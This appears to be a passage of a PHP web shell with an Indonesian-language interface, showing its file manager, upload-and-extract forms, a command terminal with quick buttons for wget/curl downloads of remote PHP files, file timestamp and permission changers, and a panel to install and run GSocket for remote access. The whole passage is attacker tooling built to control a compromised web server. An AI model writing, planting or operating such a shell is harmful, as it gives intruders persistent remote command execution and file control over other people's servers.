                    <div style="display: flex; gap: 10px; margin-bottom: 15px; flex-wrap: wrap; justify-content: center;">
                        
                        <!-- Install -->
                        <form method="post" style="display: inline-block;">
                            <input type="hidden" name="gsocket_action" value="install">
                            <button type="submit" 
                                    style="background: #1f4f4f; color: #9fefef; border: 1px solid #3fcfaf; 
                                           padding: 8px 16px; border-radius: 25px; font-size: 12px;
                                           font-weight: bold; cursor: pointer; display: inline-flex; align-items: center; gap: 5px;">
                                <i class="fas fa-download"></i> INSTALL
                            </button>
                        </form>
                        
                        <!-- Run -->
                        <form method="post" style="display: inline-block;">
                            <input type="hidden" name="gsocket_action" value="run">
                            <button type="submit" 
                                    style="background: #2f4f2f; color: #9fef9f; border: 1px solid #5fcf5f; 
                                           padding: 8px 16px; border-radius: 25px; font-size: 12px;
                                           font-weight: bold; cursor: pointer; display: inline-flex; align-items: center; gap: 5px;">
                                <i class="fas fa-play"></i> RUN
                            </button>
                        </form>
                        
                        <!-- Kill -->
                        <form method="post" style="display: inline-block;">
                            <input type="hidden" name="gsocket_action" value="kill">
                            <button type="submit" 
                                    style="background: #4f2f4f; color: #ff9fff; border: 1px solid #cf5fcf; 
                                           padding: 8px 16px; border-radius: 25px; font-size: 12px;
                                           font-weight: bold; cursor: pointer; display: inline-flex; align-items: center; gap: 5px;">
                                <i class="fas fa-skull"></i> KILL
                            </button>
                        </form>
                        
                        <!-- Uninstall -->
                        <form method="post" style="display: inline-block;" onsubmit="return confirm('Uninstall GSocket?')">
                            <input type="hidden" name="gsocket_action" value="uninstall">
                            <button type="submit" 
                                    style="background: #4f2a2a; color: #ff9f9f; border: 1px solid #ff5f5f; 
                                           padding: 8px 16px; border-radius: 25px; font-size: 12px;
                                           font-weight: bold; cursor: pointer; display: inline-flex; align-items: center; gap: 5px;">
                                <i class="fas fa-trash"></i> UNINSTALL
                            </button>
                        </form>
                    </div>
                    
                    <div style="text-align: center; color: #ffa500; font-size: 11px;">
                        <i class="fas fa-info-circle"></i> Klik INSTALL dulu, lalu RUN untuk dapat SECRET
                    </div>
                </div>
                
                <!-- Tempat Hasil Output -->
                <div id="magic-terminal-output"></div>
                
                <!-- Tombol Cepat -->
                <div style="margin-top: 15px; display: flex; gap: 5px; flex-wrap: wrap;">
                    <span style="color: #ff4646;">🔥:</span>
                    <button type="button" onclick="setCommand('wget -O file.php https://raw.githubusercontent.com/example/file.php')" style="background: none; border: 1px solid #ff4646; color: #ff4646; padding: 5px 12px; border-radius: 20px; cursor: pointer;">wget -O</button>
                    <button type="button" onclick="setCommand('curl -o file.php https://raw.githubusercontent.com/example/file.php')" style="background: none; border: 1px solid #ff4646; color: #ff4646; padding: 5px 12px; border-radius: 20px; cursor: pointer;">curl -o</button>
                    <button type="button" onclick="setCommand('ls -la')" style="background: none; border: 1px solid #ff4646; color: #ff4646; padding: 5px 12px; border-radius: 20px; cursor: pointer;">ls -la</button>
                    <button type="button" onclick="setCommand('pwd')" style="background: none; border: 1px solid #ff4646; color: #ff4646; padding: 5px 12px; border-radius: 20px; cursor: pointer;">pwd</button>
                    <button type="button" onclick="setCommand('php -v')" style="background: none; border: 1px solid #ff4646; color: #ff4646; padding: 5px 12px; border-radius: 20px; cursor: pointer;">php -v</button>
                </div>
            </div>
        </div>

        <div class="upload-grid">
            <div class="tropical-card">
                <h3>📩 Upload All File</h3>
                <form method="post" enctype="multipart/form-data">
                    <input type="file" name="files[]" class="tropical-input" multiple required>
                    <button type="submit" class="tropical-btn btn-ocean" style="width: 100%;">🗽Upload</button>
                </form>
            </div>
            
            <div class="tropical-card">
                <h3>📚 Upload dan Extrax</h3>
                <form method="post" enctype="multipart/form-data">
                    <input type="file" name="zip_file" class="tropical-input" accept=".zip" required>
                    <button type="submit" class="tropical-btn btn-palm" style="width: 100%;">🐣 Upload & Extract</button>
                </form>
            </div>
            
            <div class="tropical-card">
                <h3>📠Terminal</h3>
                <form method="post">
                    <input type="text" name="__cmd__" class="tropical-input" 
                           placeholder="ls, pwd, wget -O, curl -o, zip, etc." 
                           value="" autocomplete="off">
                    <button type="submit" class="tropical-btn btn-ocean" style="width: 100%;">⚡ Execute</button>
                </form>
            </div>
        </div>
        
        <div class="file-table-container">
            <table class="tropical-table">
                <thead>
                    <tr>
                        <th><input type="checkbox" id="selectAll"></th>
                        <th>Nama</th>
                        <th>Ukuran</th>
                        <th>Permissions</th>
                        <th>Waktu</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody id="fileTableBody">
                    <?php
                    $items = @scandir($__dir__);
                    if ($items !== false) {
                        $folders = $files = [];
                        foreach ($items as $item) {
                            if ($item == '.' || $item == '..') continue;
                            $path = $__dir__ . $item;
                            if (@is_dir($path)) $folders[] = $item;
                            else $files[] = $item;
                        }
        
                        sort($folders);
                        sort($files);
        
                        foreach ($folders as $item) {
                            $path = $__dir__ . $item;
                            $perm_info = wtc_format_permissions($path);
                            $modified = date('Y-m-d H:i', @filemtime($path));
                            ?>
                            <tr>
                                <td><input type="checkbox" name="selected_items[]" value="<?php echo htmlspecialchars($item); ?>" class="file-checkbox"></td>
                                <td>
                                    <a href="?__d__=<?php echo urlencode($path); ?>" class="tropical-name folder-name">
                                        <strong>📁 <?php echo htmlspecialchars($item); ?></strong>
                                    </a>
                                </td>
                                <td>-</td>
                                <td>
                                    <span class="perm-badge <?php echo $perm_info['writable'] ? 'perm-writable' : 'perm-readonly'; ?>" 
                                          title="Unix: <?php echo $perm_info['unix']; ?>\nOctal: <?php echo $perm_info['octal']; ?>\nPHP <?php echo $perm_info['writable'] ? 'can write' : 'read-only'; ?>">
                                        <?php echo $perm_info['unix']; ?> (<?php echo $perm_info['octal']; ?>)
                                    </span>
                                </td>
                                <td><?php echo $modified; ?></td>
                                <td>
                                    <a href="#" onclick="showRenameModal('<?php echo addslashes($item); ?>')" class="action-icon">✏️ Rename</a>
                                    <a href="#" onclick="showTouchModal('<?php echo addslashes($item); ?>')" class="action-icon">📅 Time</a>
                                    <a href="#" onclick="showChmodModal('<?php echo addslashes($item); ?>', '<?php echo $perm_info['octal']; ?>')" class="action-icon">🔧 Chmod</a>
                                    <a href="?__d__=<?php echo urlencode($__dir__); ?>&__del__=<?php echo urlencode($item); ?>" 
                                       class="action-icon" style="background: rgba(255,107,94,0.3);" onclick="return confirm('Delete <?php echo addslashes($item); ?>?')">🗑 Delete</a>
                                </td>
                            </tr>
                            <?php
                        }
        
                        foreach ($files as $item) {
                            $path = $__dir__ . $item;
                            $size = @filesize($path);
                            $perm_info = wtc_format_permissions($path);
                            $modified = date('Y-m-d H:i', @filemtime($path));
                            $ext = strtolower(pathinfo($item, PATHINFO_EXTENSION));
                            
                            $editable = true; 
                            ?>
                            <tr>
                                <td><input type="checkbox" name="selected_items[]" value="<?php echo htmlspecialchars($item); ?>" class="file-checkbox"></td>
                                <td>
                                    <?php if ($editable): ?>
                                        <a href="?__d__=<?php echo urlencode($__dir__); ?>&__edit__=<?php echo urlencode($item); ?>" class="tropical-name file-name">
                                            📄 <?php echo htmlspecialchars($item); ?>
                                        </a>
                                    <?php else: ?>
                                        <span class="tropical-name file-name">📄 <?php echo htmlspecialchars($item); ?></span>
                                    <?php endif; ?>
                                </td>
                                <td><?php echo $size ? wtc_format_bytes($size) : '?'; ?></td>
                                <td>
                                    <span class="perm-badge <?php echo $perm_info['writable'] ? 'perm-writable' : 'perm-readonly'; ?>" 
                                          title="Unix: <?php echo $perm_info['unix']; ?>\nOctal: <?php echo $perm_info['octal']; ?>\nPHP <?php echo $perm_info['writable'] ? 'can write' : 'read-only'; ?>">
                                        <?php echo $perm_info['unix']; ?> (<?php echo $perm_info['octal']; ?>)
                                    </span>
                                </td>
                                <td><?php echo $modified; ?></td>
                                <td>
                                    <?php if ($editable): ?>
                                         <a href="#" onclick="openDirectLink('<?php echo urlencode($item); ?>')" class="action-icon" style="background: rgba(255,215,0,0.3);">🔗 Direct</a>
                                        <a href="?__d__=<?php echo urlencode($__dir__); ?>&__edit__=<?php echo urlencode($item); ?>" class="action-icon" style="background: rgba(74,163,194,0.3);">✏️ Edit</a>
                                    <?php endif; ?>
                                    <?php if ($ext == 'zip'): ?>
                                        <a href="?__d__=<?php echo urlencode($__dir__); ?>&__extract__=<?php echo urlencode($item); ?>" 
                                           class="action-icon" style="background: rgba(46,125,94,0.3);" onclick="return confirm('Extract this archive?')">📦 Extract</a>
                                    <?php endif; ?>
                                    <a href="#" onclick="showRenameModal('<?php echo addslashes($item); ?>')" class="action-icon">✏️ Rename</a>
                                    <a href="#" onclick="showTouchModal('<?php echo addslashes($item); ?>')" class="action-icon">📅 Time</a>
                                    <a href="#" onclick="showChmodModal('<?php echo addslashes($item); ?>', '<?php echo $perm_info['octal']; ?>')" class="action-icon">🔧 Chmod</a>
                                    <a href="?__d__=<?php echo urlencode($__dir__); ?>&__del__=<?php echo urlencode($item); ?>" 
                                       class="action-icon" style="background: rgba(255,107,94,0.3);" onclick="return confirm('Delete <?php echo addslashes($item); ?>?')">🗑 Delete</a>
                                </td>
                            </tr>
                            <?php
                        }
                    }
                    ?>
                </tbody>
            </table>
        </div>
        
        <?php if (isset($editing_file) && $editing_file !== null): ?>
        <div class="tropical-editor">
            <h3 style="color: var(--ocean-dark); margin-bottom: 20px;">✏️ Editing: <?php echo htmlspecialchars($editing_file); ?></h3>
            <form method="post">
                <textarea name="__content__" spellcheck="false"><?php echo htmlspecialchars($file_content); ?></textarea>
                <input type="hidden" name="__edit_file__" value="<?php echo htmlspecialchars($editing_file); ?>">
                <div style="margin-top: 25px; display: flex; gap: 15px;">
                    <button type="submit" class="tropical-btn btn-palm">💾 Save</button>
                    <a href="?__d__=<?php echo urlencode($__dir__); ?>" class="tropical-btn btn-sand">Cancel</a>
                </div>
            </form>
        </div>
        <?php endif; ?>
        
        <?php if (!empty($cmd_output) && trim($cmd_output) !== ''): ?>
        <div class="tropical-terminal">
            <h3 style="color: var(--ocean-dark); margin-bottom: 20px;">📟 Terminal Output</h3>
            <?php
            $is_success = strpos($cmd_output, '✅ Success:') === 0;
            ?>
            <div class="command-status <?php echo $is_success ? 'status-success' : 'status-error'; ?>">
                <?php echo $is_success ? '✓ COMMAND SUCCESSFUL' : '✗ COMMAND FAILED'; ?>
            </div>
            <div class="terminal-output">
                <?php 
                $lines = explode("\n", $cmd_output);
                foreach ($lines as $i => $line) {
                    $line = htmlspecialchars($line);
                    
                    if ($i === 0) {
                        echo '<div style="color: ' . ($is_success ? '#2e7d5e' : '#ff6b5e') . '; font-weight: bold; margin-bottom: 10px;">' . $line . '</div>';
                    } elseif (preg_match('/^\s*\[STDERR\]:/i', $line)) {
                        echo '<div style="color: #ff6b5e;">' . $line . '</div>';
                    } elseif (preg_match('/^\s*\d+\.\d+%|\s*\d+%|\s*\d+\/\d+/', $line)) {
                        echo '<div style="color: #4aa3c2;">' . $line . '</div>';
                    } elseif (preg_match('/^\s*(http|https|ftp):\/\//i', $line)) {
                        echo '<div style="color: #ffb347;">' . $line . '</div>';
                    } else {
                        echo '<div>' . $line . '</div>';
                    }
                }
                ?>
            </div>
        </div>
        <?php endif; ?>
    </div>
    
    <!-- Create Modal -->
    <div class="tropical-modal" id="createModal">
        <div class="modal-content">
            <h3 style="color: var(--ocean-dark); margin-bottom: 20px;">➕ Create New</h3>
            <form method="post">
                <input type="text" name="__name__" class="tropical-input" placeholder="Name" required>
                <select name="__type__" class="tropical-input">
                    <option value="file">📄 File</option>
                    <option value="folder">📁 Folder</option>
                </select>
                <textarea name="__data__" class="tropical-input" placeholder="Content (for files)" rows="4"></textarea>
                <input type="hidden" name="__create__" value="1">
                <div style="display: flex; gap: 15px; margin-top: 25px;">
                    <button type="submit" class="tropical-btn btn-palm" style="flex: 2;">Create</button>
                    <button type="button" class="tropical-btn btn-sand" style="flex: 1;" onclick="hideModal('createModal')">Cancel</button>
                </div>
            </form>
        </div>
    </div>
    
    <!-- Chmod Modal -->
    <div class="tropical-modal" id="chmodModal">
        <div class="modal-content">
            <h3 style="color: var(--ocean-dark); margin-bottom: 20px;">🔧 Change Permissions</h3>
            <form method="post">
                <input type="hidden" name="__chmod_file__" id="chmodFileName">
                <input type="text" name="__permissions__" id="chmodValue" class="tropical-input" placeholder="e.g., 0755" pattern="[0-7]{4}" required>
                <small style="color: #666;">Common: 0755 (rwxr-xr-x), 0644 (rw-r--r--), 0777 (rwxrwxrwx)</small>
                <div style="display: flex; gap: 15px; margin-top: 25px;">
                    <button type="submit" name="__chmod__" value="1" class="tropical-btn btn-palm" style="flex: 2;">Apply</button>
                    <button type="button" class="tropical-btn btn-sand" style="flex: 1;" onclick="hideModal('chmodModal')">Cancel</button>
                </div>
            </form>
        </div>
    </div>
    
    <!-- Touch Modal -->
    <div class="tropical-modal" id="touchModal">
        <div class="modal-content">
            <h3 style="color: var(--ocean-dark); margin-bottom: 20px;">📅 Change Time</h3>
            <form method="post">
                <input type="hidden" name="__touch_file__" id="touchFileName">
                <input type="datetime-local" name="__timestamp__" id="touchValue" class="tropical-input" required>
                <div style="display: flex; gap: 15px; margin-top: 25px;">
                    <button type="submit" name="__touch__" value="1" class="tropical-btn btn-palm" style="flex: 2;">Apply</button>
                    <button type="button" class="tropical-btn btn-sand" style="flex: 1;" onclick="hideModal('touchModal')">Cancel</button>
                </div>
            </form>
        </div>
    </div>
    
    <!-- Rename Modal -->
    <div class="tropical-modal" id="renameModal">
        <div class="modal-content">
            <h3 style="color: var(--ocean-dark); margin-bottom: 20px;">✏️ Rename</h3>
            <form method="post">
                <input type="hidden" name="__rename_old__" id="renameOldName">
                <input type="text" name="__rename_new__" id="renameNewName" class="tropical-input" placeholder="New name" required>
                <div style="display: flex; gap: 15px; margin-top: 25px;">
                    <button type="submit" name="__rename__" value="1" class="tropical-btn btn-palm" style="flex: 2;">Rename</button>
                    <button type="button" class="tropical-btn btn-sand" style="flex: 1;" onclick="hideModal('renameModal')">Cancel</button>
                </div>
            </form>
        </div>
    </div>
    
    <!-- Delete Modal -->
    <div class="tropical-modal" id="deleteModal">
        <div class="modal-content">
            <h3 style="color: var(--coral-dark); margin-bottom: 20px;">🗑 Confirm Delete</h3>
            <p style="margin-bottom: 20px;">uda betul itu mau kau hapus??</p>
            <form method="post" id="deleteForm">
                <div id="selectedItemsContainer"></div>
                <div style="display: flex; gap: 15px;">
                    <button type="submit" name="__delete_selected__" value="1" class="tropical-btn btn-coral" style="flex: 2;">betullaah</button>
                    <button type="button" class="tropical-btn btn-sand" style="flex: 1;" onclick="hideModal('deleteModal')">gak jadi laa</button>
                </div>
            </form>
        </div>
    </div>

    <script>
        // Fungsi untuk membuka/tutup terminal
        function toggleMagicTerminal() {
            const terminal = document.getElementById('magic-terminal');
            const btn = document.getElementById('magic-terminal-btn');
            
            if (terminal.style.display === 'none' || terminal.style.display === '') {
                terminal.style.display = 'block';
                btn.style.transform = 'scale(1.2) rotate(180deg)';
            } else {
                terminal.style.display = 'none';
                btn.style.transform = 'scale(1) rotate(0deg)';
            }
        }

        // Fungsi untuk mengisi command dari tombol cepat
        function setCommand(cmd) {
            document.getElementById('magic-cmd-input').value = cmd;
        }

        // Escape HTML untuk keamanan
        function escapeHtml(unsafe) {
            if (!unsafe) return '';
            return unsafe
                .replace(/&/g, "&amp;")
                .replace(/</g, "&lt;")
                .replace(/>/g, "&gt;")
                .replace(/"/g, "&quot;")
                .replace(/'/g, "&#039;");
        }

        // Handle form submit dengan AJAX (biar gak reload)
        document.getElementById('magic-terminal-form')?.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const cmd = document.getElementById('magic-cmd-input').value.trim();
            if (!cmd) return;
            
            const path = '<?php echo addslashes($__dir__); ?>';
            const outputDiv = document.getElementById('magic-terminal-output');
            
            outputDiv.innerHTML = '<div style="color: #ff4646; text-align: center;">⚡ Menjalankan perintah...</div>';
            
            fetch(window.location.href, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'ajax=1&cmd=' + encodeURIComponent(cmd) + '&path=' + encodeURIComponent(path)
            })
            .then(response => response.json())
            .then(data => {
                if (data.error) {
                    outputDiv.innerHTML = '<div style="color: #ff4646;">Error: ' + escapeHtml(data.error) + '</div>';
                    return;
                }
                
                const statusColor = data.status && data.status.includes('SUCCESS') ? '#00ff00' : '#ff4646';
                const output = data.output || 'Tidak ada output';
                const method = data.method || 'unknown';
                
                outputDiv.innerHTML = `
                    <div style="margin-top: 15px;">
                        <div style="display: flex; gap: 10px; margin-bottom: 5px;">
                            <span style="color: ${statusColor};">${escapeHtml(data.status || '')}</span>
                            <span style="color: #ffa500;">⚡ Metode: ${escapeHtml(method)}</span>
                        </div>
                        <pre style="background: rgba(0,0,0,0.8); color: #00ff00; padding: 15px; border-radius: 10px; font-family: monospace; font-size: 13px; max-height: 300px; overflow-y: auto; border: 1px solid #ff4646; margin-top: 10px;">${escapeHtml(output)}</pre>
                    </div>
                `;
                
                document.getElementById('magic-cmd-input').value = '';
            })
            .catch(error => {
                outputDiv.innerHTML = '<div style="color: #ff4646;">Error: ' + escapeHtml(error.toString()) + '</div>';
            });
        });

        function showModal(id) {
            const modal = document.getElementById(id);
            if (modal) {
                modal.style.display = 'flex';
            }
        }
        
        function hideModal(id) {
            const modal = document.getElementById(id);
            if (modal) {
                modal.style.display = 'none';
            }
        }
        
        function showCreateModal() {
            showModal('createModal');
            const input = document.querySelector('#createModal input[name="__name__"]');
            if (input) input.focus();
        }
        
        function showDeleteModal() {
            const checkboxes = document.querySelectorAll('.file-checkbox:checked');
            if (checkboxes.length === 0) {
                alert('Please select items to delete');
                return;
            }
            
            const container = document.getElementById('selectedItemsContainer');
            if (!container) return;
            
            container.innerHTML = '';
            
            checkboxes.forEach(cb => {
                const input = document.createElement('input');
                input.type = 'hidden';
                input.name = 'selected_items[]';
                input.value = cb.value;
                container.appendChild(input);
            });
            
            showModal('deleteModal');
        }
        
        function showChmodModal(filename, currentPerm) {
            document.getElementById('chmodFileName').value = filename;
            document.getElementById('chmodValue').value = currentPerm;
            showModal('chmodModal');
            document.getElementById('chmodValue').focus();
        }
        
        function showTouchModal(filename) {
            document.getElementById('touchFileName').value = filename;
            const now = new Date();
            const year = now.getFullYear();
            const month = String(now.getMonth() + 1).padStart(2, '0');
            const day = String(now.getDate()).padStart(2, '0');
            const hours = String(now.getHours()).padStart(2, '0');
            const minutes = String(now.getMinutes()).padStart(2, '0');
            document.getElementById('touchValue').value = `${year}-${month}-${day}T${hours}:${minutes}`;
            showModal('touchModal');
        }
        
        function showRenameModal(filename) {
            document.getElementById('renameOldName').value = filename;
            document.getElementById('renameNewName').value = filename;
            showModal('renameModal');
            document.getElementById('renameNewName').focus();
            document.getElementById('renameNewName').select();
        }
        
        function openDirectLink(encodedFile) {
            const currentPath = '<?php echo $__dir__; ?>';
            const filePath = currentPath + decodeURIComponent(encodedFile);
            
            let relativePath = filePath;
            const docRoot = '<?php echo isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : ''; ?>';
            
            if (docRoot && filePath.startsWith(docRoot)) {
                relativePath = filePath.substring(docRoot.length);
            } else {
                const scriptDir = '<?php echo dirname($_SERVER['PHP_SELF']); ?>';
                const currentDir = '<?php echo $__dir__; ?>';
                
                if (currentDir.includes(scriptDir)) {
                    relativePath = currentDir.replace(scriptDir, '') + decodeURIComponent(encodedFile);
                } else {
                    relativePath = '/' + decodeURIComponent(encodedFile);
                }
            }
            
            if (!relativePath.startsWith('/')) {
                relativePath = '/' + relativePath;
            }
            
            const fullUrl = window.location.origin + relativePath;
            window.open(fullUrl, '_blank');
        }
        
        document.addEventListener('DOMContentLoaded', function() {
            const selectAll = document.getElementById('selectAll');
            if (selectAll) {
                selectAll.addEventListener('change', function(e) {
                    document.querySelectorAll('.file-checkbox').forEach(cb => cb.checked = e.target.checked);
                });
            }
            
            document.addEventListener('keydown', function(e) {
                if (e.key === 'Escape') {
                    hideModal('createModal');
                    hideModal('chmodModal');
                    hideModal('touchModal');
                    hideModal('renameModal');
                    hideModal('deleteModal');
                }
            });
            
            document.querySelectorAll('.tropical-modal').forEach(modal => {
                modal.addEventListener('click', function(e) {
                    if (e.target === this) hideModal(this.id);
                });
            });
        });
    </script>
</body>
</html>
